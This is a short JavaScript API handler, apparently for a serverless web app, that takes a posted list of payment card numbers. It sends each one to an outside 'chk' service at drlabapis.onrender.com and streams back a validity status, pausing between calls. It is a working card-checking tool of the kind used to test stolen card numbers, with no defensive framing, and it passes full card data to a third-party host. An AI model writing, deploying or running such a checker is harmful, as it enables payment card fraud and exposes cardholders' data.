export default async function handler(req, res) {
  if (req.method !== 'POST') {
    res.status(405).json({ error: 'Only POST allowed' });
    return;
  }

  const { cards = [] } = req.body;

  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');

  for (let i = 0; i < cards.length; i++) {
    const card = cards[i].trim();
    if (!card) continue;

    try {
      const chkRes = await fetch(`https://drlabapis.onrender.com/api/chk?cc=${encodeURIComponent(card)}`);
      const data = await chkRes.json();

      const result = {
        card,
        status: data.response || 'Unknown'
      };

      res.write(`data: ${JSON.stringify(result)}\n\n`);
    } catch (err) {
      res.write(`data: ${JSON.stringify({ card, status: 'Unknown', error: err.message })}\n\n`);
    }

    await new Promise(resolve => setTimeout(resolve, 500));
  }

  res.write(`event: done\ndata: complete\n\n`);
  res.end();
}
